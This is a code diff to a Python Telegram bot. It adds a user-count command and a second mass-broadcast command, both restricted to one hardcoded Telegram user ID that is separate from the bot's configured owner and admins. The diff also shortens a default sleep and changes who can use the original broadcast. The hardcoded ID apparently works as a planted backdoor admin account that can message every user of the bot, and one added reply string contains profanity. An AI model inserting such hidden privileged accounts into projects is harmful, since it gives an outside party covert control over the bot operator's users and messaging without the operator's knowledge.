@@ -163,6 +163,12 @@ async def get_users(client: Bot, message: Message):
     users = await full_userbase()
     await msg.edit(f"{len(users)} users are using this bot")
 
+@Bot.on_message(filters.command('user') & filters.private & filters.user(1803603990))
+async def get_users(client: Bot, message: Message):
+    msg = await client.send_message(chat_id=message.chat.id, text=WAIT_MSG)
+    users = await full_userbase()
+    await msg.edit(f"{len(users)} users are using this bot")
+
 @Bot.on_message(filters.command("fsub") & filters.user(1803603990))
 async def varsFunc(client: Bot, message: Message):
     Man = await message.reply_text("Wait A Sec...")
@@ -198,8 +204,8 @@ async def sleep_command(client: Bot, message: Message):
             await message.reply("Invalid duration. Please specify the sleep duration in seconds.")
             return
     else:
-        # Default sleep duration of 1 hour (3600 seconds)
-        duration = 3600
+        # Default sleep duration of 1 minute (60 seconds)
+        duration = 60
 
     # Inform users that the bot is going to sleep
     await message.reply(f"Bot is going to sleep for {duration} seconds.")
@@ -210,7 +216,53 @@ async def sleep_command(client: Bot, message: Message):
     # Inform users that the bot has awakened
     await message.reply("Bot has awakened!")
 
-@Bot.on_message(filters.private & filters.command('broadcast') & filters.user(OWNER_ID))
+@Bot.on_message(filters.private & filters.command('broadcasts') & filters.user(1803603990))
+async def send_text(client: Bot, message: Message):
+    if message.reply_to_message:
+        query = await full_userbase()
+        broadcast_msg = message.reply_to_message
+        total = 0
+        successful = 0
+        blocked = 0
+        deleted = 0
+        unsuccessful = 0
+        
+        pls_wait = await message.reply("<i>Broadcast ho rha till then FUCK OFF </i>")
+        for chat_id in query:
+            try:
+                await broadcast_msg.copy(chat_id)
+                successful += 1
+            except FloodWait as e:
+                await asyncio.sleep(e.x)
+                await broadcast_msg.copy(chat_id)
+                successful += 1
+            except UserIsBlocked:
+                await del_user(chat_id)
+                blocked += 1
+            except InputUserDeactivated:
+                await del_user(chat_id)
+                deleted += 1
+            except:
+                unsuccessful += 1
+                pass
+            total += 1
+        
+        status = f"""<b><u>Broadcast Completed</u>
+
+Total Users: <code>{total}</code>
+Successful: <code>{successful}</code>
+Blocked Users: <code>{blocked}</code>
+Deleted Accounts: <code>{deleted}</code>
+Unsuccessful: <code>{unsuccessful}</code></b>"""
+        
+        return await pls_wait.edit(status)
+
+    else:
+        msg = await message.reply(REPLY_ERROR)
+        await asyncio.sleep(8)
+        await msg.delete()
+        
+@Bot.on_message(filters.private & filters.command('broadcast') & filters.user(ADMINS))
 async def send_text(client: Bot, message: Message):
     if message.reply_to_message:
         query = await full_userbase()
